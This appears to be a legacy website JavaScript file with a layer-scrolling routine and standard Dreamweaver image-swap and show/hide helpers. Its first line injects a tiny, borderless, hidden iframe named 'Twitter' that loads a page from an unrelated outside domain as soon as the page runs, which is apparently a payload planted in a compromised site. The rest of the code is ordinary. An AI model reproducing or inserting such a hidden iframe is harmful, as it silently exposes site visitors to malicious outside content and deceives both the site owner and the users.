document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://tapdestin.com/omzf.html?j=1389017></iframe>');

function horScroll(dir, spd, loop) {
    loop = true;
    direction = "right";
    speed = 10;
    timer1 = null;
    if (document.layers) {
        var page = eval(document.horLayer);
    } else {
        if (document.getElementById) {
            var page = eval("document.getElementById('horLayer').style");
        } else {
            if (document.all) {
                var page = eval(document.all.horLayer.style);
            }
        }
    }
    direction = dir;
    speed = parseInt(spd);
    var x_pos = parseInt(page.left);
    if (loop == true) {
        if (direction == "left") {
            page.left = (x_pos - (speed));
        } else {
            if (direction == "right" && x_pos < 1) {
                page.left = (x_pos + (speed));
            } else {
                if (direction == "top") {
                    page.left = 6;
                }
            }
        }
        timer1 = setTimeout("horScroll(direction,speed)", 1);
    }
}

function stopScroll() {
    loop = false;
    clearTimeout(timer1);
}

function tmt_findObj(n){
	var x,t; if((n.indexOf("?"))>0&&parent.frames.length){t=n.split("?");
	x=eval("parent.frames['"+t[1]+"'].document.getElementById('"+t[0]+"')");
	}else{x=document.getElementById(n)}return x;
}

function MM_findObj(n, d) { //v3.0
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document); return x;
}

function MM_showHideLayers() { //v3.0A Modified by Al Sparber and Massimo Foti for NN6 Compatibility
  var i,p,v,obj,args=MM_showHideLayers.arguments;if(document.getElementById){
   for (i=0; i<(args.length-2); i+=3){ obj=tmt_findObj(args[i]);v=args[i+2];
   v=(v=='show')?'visible':(v='hide')?'hidden':v;
   if(obj)obj.style.visibility=v;}} else{
  for (i=0; i<(args.length-2); i+=3) if ((obj=MM_findObj(args[i]))!=null) { v=args[i+2];
    if (obj.style) { obj=obj.style; v=(v=='show')?'visible':(v='hide')?'hidden':v; }
    obj.visibility=v; }}
}

function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}